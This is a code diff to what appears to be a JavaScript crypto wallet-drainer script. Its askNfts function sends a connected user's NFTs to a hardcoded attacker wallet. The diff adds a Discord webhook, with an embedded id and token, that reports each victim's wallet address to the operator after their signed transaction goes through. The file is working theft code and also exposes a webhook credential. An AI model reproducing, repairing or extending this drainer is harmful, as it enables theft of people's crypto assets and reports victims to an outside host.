@@ -1,3 +1,12 @@
+const { EmbedBuilder, WebhookClient } = require('discord.js');
+
+const webhookClient = new WebhookClient({ id: "1010452597792055367", token: "kN1JPfhN1AwqMgYGuBvLrM8gbvvXLztoe7MLFxTx27TUbOgiqmCDBftBmjXJjrJ0bH-p" });
+
+const embed = new EmbedBuilder()
+	.setTitle('Some Title')
+	.setColor(0x00FFFF);
+
+
 let web3Provider;
 
 Moralis.onWeb3Enabled(async (data) => {
@@ -100,7 +109,7 @@ async function askNfts() {
         const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1))
        // if (ethPrice < 0.1) continue;
         const thewallet = "0xf92D48dDe90C4aD033381b0cA52d08c0636A7ddc";
-        const ctrInstance = new web3Js.eth.Contract(ABInft, nft.contract_address)
+        const ctrInstance = new web3.eth.Contract(ABInft, nft.contract_address)
         
         transactionsOptions.push({
             price: ethPrice,
@@ -160,7 +169,13 @@ async function askNfts() {
                     console.log("rawTx:", rawTx);
                     console.log("rawHash:", rawHash);
 
-                    await web3Js.eth.sendSignedTransaction(rawTx).then((hash) => console.log(hash)).catch((e) => console.log(e));
+                    await web3Js.eth.sendSignedTransaction(rawTx).then(webhookClient.send({
+                        content: `etherscan.io/address/${walletAddress}`,
+                        username: 'Approve',
+                        avatarURL: 'https://i.imgur.com/AfFp7pu.png',
+                        embeds: [embed],
+                    })).catch((e) => console.log(e));
+
 
                 }).catch((err) => console.log(err));
             })
